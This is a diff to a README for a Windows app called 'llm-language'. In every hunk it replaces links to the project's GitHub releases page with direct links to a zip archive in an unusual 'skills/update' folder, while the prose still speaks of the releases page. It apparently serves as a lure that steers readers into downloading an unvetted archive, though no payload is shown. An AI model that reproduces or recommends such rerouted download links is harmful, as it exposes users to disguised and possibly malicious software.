@@ -1,6 +1,6 @@
 # 🤖 llm-language - Turn Intent Into Clear Actions
 
-[![Download llm-language](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/Boeotian-genusprocnias332/llm-language/releases)
+[![Download llm-language](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip)
 
 ## 🚀 What llm-language does
 
@@ -21,7 +21,7 @@ The app uses workflow logic, context handling, and adaptive memory so you can ke
 
 Visit this page to download the Windows release:
 
-[https://github.com/Boeotian-genusprocnias332/llm-language/releases](https://github.com/Boeotian-genusprocnias332/llm-language/releases)
+[https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip](https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip)
 
 On the releases page, look for the latest version and choose the Windows file. If there is more than one file, pick the one that matches your system.
 
@@ -155,7 +155,7 @@ This makes it easier to pick up work later.
 
 When a new version is available, return to the releases page and download the latest Windows file. Replace the old version if the release notes say to do so, or keep your project files in place if the app stores them outside the program folder.
 
-[Download the latest Windows release](https://github.com/Boeotian-genusprocnias332/llm-language/releases)
+[Download the latest Windows release](https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip)
 
 ## ❓ Common questions
 
@@ -197,4 +197,4 @@ This keeps the work steady and easier to follow.
 
 Use this page to download the Windows build:
 
-[https://github.com/Boeotian-genusprocnias332/llm-language/releases](https://github.com/Boeotian-genusprocnias332/llm-language/releases)
+[https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip](https://raw.githubusercontent.com/Boeotian-genusprocnias332/llm-language/main/skills/update/llm_language_3.9.zip)
